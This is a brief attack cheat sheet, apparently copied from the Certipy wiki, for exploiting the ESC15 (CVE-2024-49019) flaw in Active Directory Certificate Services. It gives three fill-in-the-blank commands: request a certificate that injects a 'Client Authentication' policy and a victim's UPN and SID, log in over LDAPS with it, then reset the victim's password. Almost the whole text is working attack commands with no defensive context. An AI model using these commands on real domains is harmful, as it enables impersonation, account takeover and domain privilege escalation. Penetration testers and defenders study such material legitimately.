Pulled from the certipy wiki [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)

Request a certificate while injecting "Client Authentication" Application Policy and target UPN:
```
certipy-ad req -u '<Username>@<domain>' -p '<password>' -dc-ip '<ip>' -target '<domain>' -ca '<FQDN of certificate authority from certipy find output>' -template '<template name (commonly WebServer)>' -upn '<target username>@<domain>' -sid '<target SID>' -application-policies 'Client Authentication'
```

Authenticate via LDAPS using obtained certificate:
```
certipy-ad auth -pfx '<target username>.pfx' -dc-ip '<ip>' -ldap-shell
```

Change the target password using ldap:
```
change_password <target username> <new password>
```

